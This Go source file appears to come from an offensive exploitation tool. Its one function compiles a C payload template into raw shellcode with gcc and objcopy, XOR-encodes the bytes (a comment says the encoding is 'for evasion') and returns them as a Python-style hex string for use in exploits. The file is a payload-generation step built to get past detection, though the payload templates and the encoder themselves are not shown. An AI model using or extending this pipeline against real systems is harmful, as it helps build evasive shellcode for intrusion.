package core

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
)

// CompilePayload takes a C payload name, compiles it, extracts shellcode, and returns it as a formatted hex string.
func CompilePayload(payloadName string) (string, error) {
	cFile := filepath.Join("templates", "payloads", payloadName+".c")
	if _, err := os.Stat(cFile); os.IsNotExist(err) {
		return "", fmt.Errorf("payload %s not found", cFile)
	}

	binFile := filepath.Join("templates", "payloads", payloadName+".bin")
	oFile := filepath.Join("templates", "payloads", payloadName+".o")
	
	cmd := exec.Command("gcc", "-m32", "-fno-stack-protector", "-c", cFile, "-o", oFile)
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("gcc compilation failed: %v", err)
	}
	defer os.Remove(oFile)

	cmdObj := exec.Command("objcopy", "-O", "binary", "-j", ".text", oFile, binFile)
	if err := cmdObj.Run(); err != nil {
		return "", fmt.Errorf("objcopy failed: %v", err)
	}
	defer os.Remove(binFile)

	// Read binary shellcode
	shellcodeBytes, err := ioutil.ReadFile(binFile)
	if err != nil {
		return "", fmt.Errorf("failed to read shellcode: %v", err)
	}

	// Encode shellcode for evasion
	encodedBytes, err := XOREncode(shellcodeBytes)
	if err != nil {
		return "", fmt.Errorf("failed to encode shellcode: %v", err)
	}

	// Format as Python bytes string: \x31\xc0...
	var hexStr string
	for _, b := range encodedBytes {
		hexStr += fmt.Sprintf("\\x%02x", b)
	}

	return hexStr, nil
}
